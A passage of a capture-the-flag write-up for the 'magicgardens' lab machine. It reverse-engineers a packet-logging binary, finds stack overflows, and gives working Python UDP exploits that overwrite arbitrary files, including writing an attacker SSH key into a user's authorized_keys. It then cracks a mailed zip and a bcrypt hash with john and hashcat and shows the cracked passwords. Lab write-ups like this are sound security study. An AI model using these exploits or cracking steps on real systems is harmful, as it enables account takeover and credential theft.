+harvest.1                                                   100%[=========================================================================================================================================&gt;]  21.98K   123KB/s    in 0.2s    
+
+2025-02-03 11:19:46 (123 KB/s) - ‘harvest.1’ saved [22512/22512]
+</code></pre>
+</div></div>
+<br><br>
+<p>Change File Permissions to executable</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>chmod +x harvest</code></pre>
+    </div></div>
+    <br><br>
+<p>We use <code>strace</code> to monitor <strong>file operations</strong> when running the <code>harvest</code> binary in <strong>server mode</strong> on my attacker machine</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>sudo strace -t -e trace=openat ./harvest server -l save.txt
+[sudo] password for deepak: 
+11:23:19 openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+11:23:19 openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+[*] Listening on interface ANY
+[*] Successful handshake
+11:23:22 openat(AT_FDCWD, &quot;/etc/localtime&quot;, O_RDONLY|O_CLOEXEC) = 6
+11:23:22 openat(AT_FDCWD, &quot;save.txt&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.
+11:23:22 openat(AT_FDCWD, &quot;save.txt&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.
+11:23:22 openat(AT_FDCWD, &quot;save.txt&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.
+11:23:22 openat(AT_FDCWD, &quot;save.txt&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.
+11:23:22 openat(AT_FDCWD, &quot;save.txt&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.
+&lt;SNIP&gt;</code></pre>
+</div></div>
+<br><br>
+<p>Run the <code>harvest</code> client to <strong>connect back</strong> to the server</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>./harvest client 127.0.0.1
+[*] Connection to 127.0.0.1 1337 port succeeded
+[*] Successful handshake
+P--------------------------------------------------
+Source: [f4:27:56:5a:5c:3f] [154.57.164.108]
+Dest:   [1c:39:47:ee:33:7a] [192.168.1.8]
+Time:   [11:23:24]  Length: [71]
+--------------------------------------------------
+Source: [f4:27:56:5a:5c:3f] [52.214.95.214]
+Dest:   [1c:39:47:ee:33:7a] [192.168.1.8]
+Time:   [11:23:24]  Length: [71]
+--------------------------------------------------
+&lt;SNIP&gt;</code></pre>
+</div></div>
+<br><br>
+<p><code>harvest</code> is logging network traffic to <code>save.txt</code>. The <code>strace</code> output confirms that it <strong>opens </strong><code><strong>save.txt</strong></code><strong> with write permissions (</strong><code><strong>O_WRONLY|O_CREAT|O_TRUNC, 0666</strong></code><strong>)</strong></p>
+</section>
+
+<section id="Reverse_Engineering_-_Buffer_overflow" class="section">
+<h2>Reverse Engineering - Buffer overflow:</h2>
+<p>We used Ghidra to reverse engineer the <code>harvest</code> binary.</p>
+<p>While analyzing the <code>harvest</code> binary in Ghidra, we found two suspicious functions: <code>handle_raw_packets</code> and <code>log_packet</code>.</p>
+<p><strong>handle_raw_packets</strong></p>
+<ul class="bulleted-list"><li style="list-style-type:disc">The function <code>handle_raw_packets</code> is responsible for receiving network packets and processing them. It uses multiple buffers for storing packet data, timestamps, and MAC addresses</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">The function declares a large stack buffer</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>char acStack_1001a [65554];</code></pre>
+    </div></div>
+    <br><br>
+    <ul class="bulleted-list"><li style="list-style-type:disc">This buffer is <strong>65,554 bytes (approximately 64 KB)</strong>.</li></ul>
+    <br><br>
+        <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>if (acStack_1001a[0] == &#x27;E&#x27;) {
+    print_packet(acStack_1001a, param_3, param_2, acStack_10048, acStack_10068, acStack_1007a, &amp;bStack_10028);
+}
+if (acStack_1001a[0] == &#x27;&#x27;) {
+    log_packet(acStack_1001a, param_3);
+}
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">There is no boundary check on <code>acStack_1001a</code></li></ul><ul class="bulleted-list"><li style="list-style-type:disc">The function <strong>assumes</strong> <code>acStack_1001a</code> contains valid data but <strong>never verifies</strong> how much data is stored in it.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">If <code>acStack_1001a</code> is overflowed, it can <strong>overwrite adjacent memory</strong>, potentially leading to <strong>stack corruption</strong> or <strong>remote code execution</strong></li></ul>
+<br><br>
+<img src="./image 17.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p><strong>log_packet</strong></p><p>The function <code>log_packet</code> takes in <strong>two parameters</strong>:</p><ul class="bulleted-list"><li style="list-style-type:disc"><code>param_1 (long)</code>: A pointer to a structure or memory location that contains network packet data.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><code>param_2 (char *)</code>: A file path where the log should be written.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>undefined2 local_ff88 [32680];
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">This declares a <strong>large stack buffer</strong> of <strong>32,680 × 2 bytes = 65,360 bytes</strong>.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Large stack buffers can lead to stack overflows, especially when handling un-trusted data.</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>strcpy(local_38, param_2);</code></pre>
+    </div></div>
+    <br><br>
+    <ul class="bulleted-list"><li style="list-style-type:disc"><code>local_38</code> is only <strong>40 bytes</strong>, but <code>param_2</code> is a user-controlled file path.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">If <code>param_2</code> is longer than 39 characters (excluding <code>\0</code>), it <strong>overflows </strong><code><strong>local_38</strong></code>, leading to <strong>stack corruption</strong> and possibly <strong>arbitrary code execution</strong>.</li></ul>
+    <br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>strncpy((char *)local_ff88, (char *)(param_1 + 0x3c), (ulong)uVar1);
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc"><code>uVar1 = htons(*(uint16_t *)(param_1 + 4));</code></li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This retrieves <strong>a 16-bit value</strong> from the packet and swaps the byte order.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>If </strong><code><strong>uVar1</strong></code><strong> is larger than 32,680, </strong><code><strong>strncpy</strong></code><strong> can overflow </strong><code><strong>local_ff88</strong></code>, corrupting the stack.</li></ul>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>local_10 = fopen(local_38,&quot;w&quot;);</code></pre></div></div>
+        <br><br>
+        <ul class="bulleted-list"><li style="list-style-type:disc">If an attacker controls <code>param_2</code>, they can overwrite <strong>arbitrary files</strong> (e.g., <code>/etc/passwd</code> or <code>.bashrc</code>).</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This leads to <strong>arbitrary file overwrite</strong>, potentially achieving privilege</li></ul>
+        <br><br>
+        <img src="./image 18.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+        <br><br>
+        <br><br>
+        <h3>Testing buffer overflow:</h3>
+        <p>To verify the buffer overflow vulnerability in <code>handle_raw_packets</code>, we crafted a test case by sending a large payload via a <strong>raw UDP socket over IPv6</strong>. Given that <code>handle_raw_packets</code> uses <code>recvfrom()</code> to read up to <strong>65,535 bytes</strong>, we tested if it could handle oversized input properly.</p>
+        <br><br>
+        <img src="./test_1.gif" alt="GIF Animation" style="max-width: 100%; height: auto;" loop>
+ <br><br>
+<h3>Step-by-Step Buffer Overflow Testing in Harvest:</h3>
+ <br><br>
+<p>We conducted a local test to confirm the <strong>buffer overflow vulnerability</strong> in Harvest. The following steps were executed to monitor the application&#x27;s behavior under an oversized input.</p>
+<p><strong>Step 1</strong>: Start <code>strace</code> on the Harvest Server</p>
+ <br><br>
+ <ul class="bulleted-list"><li style="list-style-type:disc">We used <code>strace</code> to monitor system calls, specifically tracking file operations (<code>openat</code>). This helps in detecting unexpected crashes or abnormal behavior.</li></ul>
+ <br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>sudo strace -t -e trace=openat ./harvest server -l save.txt
+</code></pre>
+</div></div>
+<ul class="bulleted-list"><li style="list-style-type:disc"><code>t</code> : Adds timestamps to track execution timing.</li></ul><ul  class="bulleted-list"><li style="list-style-type:disc"><code>e trace=openat</code> : Filters system calls related to file opening, helping us identify improper file writes</li></ul>
+<p><strong>Step 2</strong>: Connect the Harvest Client to the Server</p>
+<ul class="bulleted-list"><li style="list-style-type:disc">We established a connection between the client and server to ensure normal functionality before testing the exploit.</li></ul>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>./harvest client 127.0.0.1
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">The client communicates with the server, setting up the environment for the buffer overflow test.</li></ul>
+<ul class="bulleted-list"><li style="list-style-type:disc">We sent an <strong>oversized UDP payload</strong> to Harvest using the following script:</li></ul>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>import socket
+
+# Define the server address (IPv6 loopback) and target port
+server_address = (&#x27;::1&#x27;, 6666)
+
+# Create an IPv6 UDP socket
+s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+
+# Connect to the server
+s.connect(server_address)
+
+# Craft a large payload (65,500 &#x27;A&#x27; characters)
+data = b&#x27;A&#x27; * 65500  
+
+# Send the payload
+s.send(data)
+
+print(&quot;[+] Sent test payload of 65,500 bytes&quot;)</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 4: Observing the Behavior</strong></p><ul class="bulleted-list"><li style="list-style-type:disc">After running the buffer overflow test script, we noticed the following key logs from <code>strace</code>:</li></ul>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>[*] Successful handshake
+14:43:41 openat(AT_FDCWD, &quot;/etc/localtime&quot;, O_RDONLY|O_CLOEXEC) = 6
+14:43:42 --- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
+14:43:44 openat(AT_FDCWD, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
+[!] Suspicious activity. Packages have been logged.</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">The <code>[!] Suspicious activity. Packages have been logged.</code> message confirms that our input was processed in an unintended way, further proving that we successfully triggered a <strong>buffer overflow</strong> in Harvest.</li></ul>
+<br><br>
+
+<h3>Overwriting a file:</h3>
+<p>Now that we have confirmed the buffer overflow, the next step is to <strong>test whether we can overwrite a file</strong> on the system using our exploit.</p>
+<br><br>
+<img src="./over_write.gif" alt="GIF Animation" style="max-width: 100%; height: auto;" loop>
+<br><br>
+<p><strong>Step 1: </strong>Generate a unique pattern to help identify offsets</p>
+<ul class="bulleted-list"><li style="list-style-type:disc">To determine the exact offset for buffer overflow, we generate a unique cyclic pattern using Metasploit&#x27;s <code>pattern_create</code> utility.</li></ul>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>└─$ msf-pattern_create -l 65500 &gt; buffer.txt
+                                                                                                                                                                                                                                              
+
+└─$ wc buffer.txt 
+    1     1 65501 buffer.txt</code></pre>
+</div></div>
+<br><br>
+    <p><strong>Step 2: </strong>Prepare an empty target file (<code>pwn.txt</code>) to observe any changes</p><ul class="bulleted-list"><li style="list-style-type:disc">Create an empty file (<code>pwn.txt</code>) to monitor changes after the exploit:</li></ul>
+    <br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>└─$ touch pwn.txt             
+                                                                                                                                                                                                                                              
+└─$ wc pwn.txt
+0 0 0 pwn.txt</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 3: </strong>Start the Harvest server with <code>strace</code> monitoring file operations</p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>sudo strace -t -e trace=openat ./harvest server -l save.txt
+</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 4: </strong>Connect the Harvest client to the server5</p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>./harvest client 127.0.0.1
+</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 5: </strong>Execute the Python Exploit Code</p><ul class="bulleted-list"><li style="list-style-type:disc">By using the following code, we send an <strong>oversized UDP payload</strong> to Harvest and overwrite the <strong>content in a specific file location.</strong></li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>import socket
+
+server_address = (&#x27;::1&#x27;,6666)
+s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+s.connect(server_address)
+
+data = &#x27;&#x27;
+with open(&#x27;buffer.txt&#x27;, &#x27;rb&#x27;) as f:
+    data = bytearray(f.read())
+
+replace = b&quot;/tmp/pwn.txt&quot;
+
+s.send(data[:65372] + replace)
+</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 6: </strong>Observing the Behavior</p><p>This confirms that we have successfully <strong>overwritten the content</strong> in the <strong>specific file location.</strong></p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>└─$ wc pwn.txt 
+    0     1 65372 pwn.txt
+</code></pre>
+</div></div>
+</section>
+
+<section id="Local Privilege Escalation" class="section">
+<h2>Local Privilege Escalation:</h2>
+<h3>Overwriting Alex SSH:</h3>
+<p>Now that we have successfully exploited the <strong>buffer overflow vulnerability</strong> to overwrite arbitrary files, we can <strong>leverage this to gain SSH access</strong>.</p><ul class="bulleted-list"><li style="list-style-type:disc">We will <strong>overwrite Alex’s </strong><code><strong>~/.ssh/authorized_keys</strong></code><strong> file</strong> with our own SSH public key.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This will allow us to <strong>log in as Alex</strong> without needing a password</li></ul>
+<br><br>
+<img src="./alex.gif" alt="GIF Animation" style="max-width: 100%; height: auto;" loop>
+<br><br>
+<p><strong>Step 1: </strong>Generate an SSH Key</p>
+<p>To overwrite Alex’s <code>authorized_keys</code> file, we first need to generate an SSH key pair.</p><p>Run the following command to create a new SSH key:</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>ssh-keygen</code></pre>
+</div></div>
+<br><br>
+           <ul class="bulleted-list"><li style="list-style-type:disc">We will use the <strong>contents of </strong><code><strong>my_key.pub</strong></code> to overwrite <strong>Alex’s </strong><code><strong>authorized_keys</strong></code><strong> file</strong>, allowing us to SSH into the system as Alex.<br/><br/></li></ul><p><strong>Step 2: </strong>Start the Harvest Server on the Attacker Machine</p><ul class="bulleted-list"><li style="list-style-type:disc">Just like before, we need to start the <strong>Harvest</strong> server to capture and process incoming data. Run the following command:</li></ul>
+           <br><br>
+           <div class="terminal-window">
+            <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>sudo strace -t -e trace=openat ./harvest server -l save.txt</code></pre>
+        </div></div>
+        <br><br>
+        <p><strong>Step 3:</strong> Connect Harvest Client from Morty to Our Server</p>
+    
+        <ul class="bulleted-list"><li style="list-style-type:disc">On <strong>Morty</strong>, execute the following command to connect the <strong>Harvest client</strong> to our attacker machine:</li></ul>
+        <br><br>
+        <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>./harvest client &lt;tuno&gt;</code></pre>
+        </div></div>
+        <br><br>
+            <p><strong>Step 4: </strong>Ensure Harvest Server is Ready</p><ul class="bulleted-list"><li style="list-style-type:disc">Before executing the buffer overflow exploit, we need to send an initial request to ensure the Harvest server is ready to process input. Run the following command:</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">This step ensures that the server is actively listening and ready for exploitation.</li></ul>
+            <br><br>
+            <div class="terminal-window">
+            <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>echo &quot;harvest v1.0.3&quot; &gt; /dev/tcp/127.0.0.1/1337</code></pre>
+        </div></div>
+        <br><br>
+        <p><strong>Step 5: </strong>Exploit Buffer Overflow to Overwrite Alex&#x27;s SSH Authorized Keys</p><ul class="bulleted-list"><li style="list-style-type:disc">We will now use the <strong>buffer overflow vulnerability</strong> to overwrite <strong>Alex&#x27;s SSH authorized_keys file</strong>, allowing us to gain SSH access as Alex.</li></ul>
+        <p><strong>Requirements:</strong></p><ul class="bulleted-list"><li style="list-style-type:disc">The <strong>public key</strong> (<code>id_rsa.pub</code>) will be written into Alex’s <strong>authorized_keys</strong> file.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">A <strong>separate SSH shell</strong> on <strong>Morty</strong> is needed to run this Python exploit.<br/><br/></li></ul>
+        <br><br>
+        <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>import socket
+
+HOST = &#x27;::1&#x27;
+PORT = 1234
+
+
+file = b&#x27;/home/alex/.ssh/authorized_keys&#x27;
+
+nop = b&#x27;\r&#x27;
+
+key_id_rsa = b&#x27;YOUR SSH Pulic key&#x27;
+
+packet_size = 65370
+
+server_address = (HOST, PORT)
+s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+
+try:
+    s.connect(server_address)
+
+    nop_padding = nop * (packet_size - len(key_id_rsa))
+
+    packet = nop_padding + b&#x27;\n&#x27; + key_id_rsa + b&#x27;\n&#x27; + file
+
+    s.send(packet)
+    print(&quot;Send success&quot;)
+except Exception as e:
+    print(f&quot;Error: {e}&quot;)
+finally:
+    s.close()</code></pre>
+</div></div>
+<br><br>
+<p><strong>Step 6: </strong>SSH into Alex Using the Compromised Key</p><ul class="bulleted-list"><li style="list-style-type:disc">Now that we have successfully overwritten Alex’s <code>authorized_keys</code> file with our SSH public key, we can log in as Alex using SSH:<br/><br/></li></ul>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>ssh -i id_rsa alex@magicgardens.htb
+Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
+...&lt;snip&gt;...
+alex@magicgardens:~$ cat user.txt
+329d467c************************</code></pre>
+</div></div>
+<br><br>
+
+<h3>Mail:</h3><p>On connecting to SSH as alex, it said there was mail. There are two users with mailboxes in <code>/var/spool/mail</code>:</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>alex@magicgardens:/var/spool/mail$ ls
+alex  root
+alex@magicgardens:/var/spool/mail$cat alex 
+From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023
+Return-Path: &lt;root@magicgardens.magicgardens.htb&gt;
+X-Original-To: alex@magicgardens.magicgardens.htb
+Delivered-To: alex@magicgardens.magicgardens.htb
+Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)
+    id 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary=&quot;1804289383-1695994309=:37178&quot;
+Subject: Auth file for docker
+To: &lt;alex@magicgardens.magicgardens.htb&gt;
+User-Agent: mail (GNU Mailutils 3.15)
+Date: Fri, 29 Sep 2023 09:31:49 -0400
+Message-Id: &lt;20230929133149.3CDA93FC96@magicgardens.magicgardens.htb&gt;
+From: root &lt;root@magicgardens.magicgardens.htb&gt;
+
+--1804289383-1695994309=:37178
+Content-Type: text/plain; charset=UTF-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+Content-ID: &lt;20230929093149.37178@magicgardens.magicgardens.htb&gt;
+
+Use this file for registry configuration. The password is on your desk
+
+--1804289383-1695994309=:37178
+Content-Type: application/octet-stream; name=&quot;auth.zip&quot;
+Content-Disposition: attachment; filename=&quot;auth.zip&quot;
+Content-Transfer-Encoding: base64
+Content-ID: &lt;20230929093149.37178.1@magicgardens.magicgardens.htb&gt;
+
+UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
+6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
+q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
+AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
+ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=
+--1804289383-1695994309=:37178--
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">It’s from root to alex, and there’s an <code>auth.zip</code> attachment.</li></ul><ul
+ class="bulleted-list"><li style="list-style-type:disc">Email attachments are encoded with base64</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">To decode and extract the file, we used the following command:</li></ul>
+ <br><br>
+ <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>echo &quot;UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
+6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
+q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
+AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
+ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=&quot; | base64 -d &gt; auth.zip
+</code></pre>
+</div></div>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>unzip auth.zip                                                                    
+Archive:  auth.zip
+[auth.zip] htpasswd password:  </code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">The <code>auth.zip</code> file was <strong>password-protected</strong>, preventing us from extracting its contents directly.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"> We used <strong>zip2john</strong> to extract the password hash from <code>auth.zip</code>:</li></ul>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>zip2john auth.zip &gt; zip_hash
+ver 1.0 efh 5455 efh 7875 auth.zip/htpasswd PKZIP Encr: 2b chk, TS_chk, cmplen=84, decmplen=72, crc=B238A674 ts=A86E cs=a86e type=0
+</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">Then used <strong>John the Ripper</strong> with the popular <code>rockyou.txt</code> wordlist:</li></ul>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+realmadrid       (auth.zip/htpasswd)     
+1g 0:00:00:00 DONE (2025-02-03 13:41) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">John successfully cracked the password</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">With the cracked password <code>realmadrid</code>, we successfully extracted the contents of <code>auth.zip</code></li></ul><br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>unzip auth.zip
+Archive:  auth.zip
+[auth.zip] htpasswd password: 
+extracting: htpasswd </code></pre>
+</div></div>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>cat htpasswd 
+AlexMiles:$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq</code></pre>
+</div></div>
+<br><br>
+<ul class="bulleted-list"><li style="list-style-type:disc">We found a <strong>username (</strong><code><strong>AlexMiles</strong></code><strong>)</strong> and a <strong>bcrypt password hash</strong>. The next 
+step is to crack this hash to retrieve the actual password.<br/><br/><br/></li></ul>
+<br><br>
+<h3>Alex password hash:</h3>
+<p>Using <strong>Hashcat</strong>, We were able to crack Alex&#x27;s password.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>hashcat -m 3200  alex_hash /usr/share/wordlists/rockyou.txt -a 0
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i3-5005U CPU @ 2.00GHz, 2872/5808 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+
+$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds
+                                                          
+Session..........: hashcat
+Status...........: Cracked
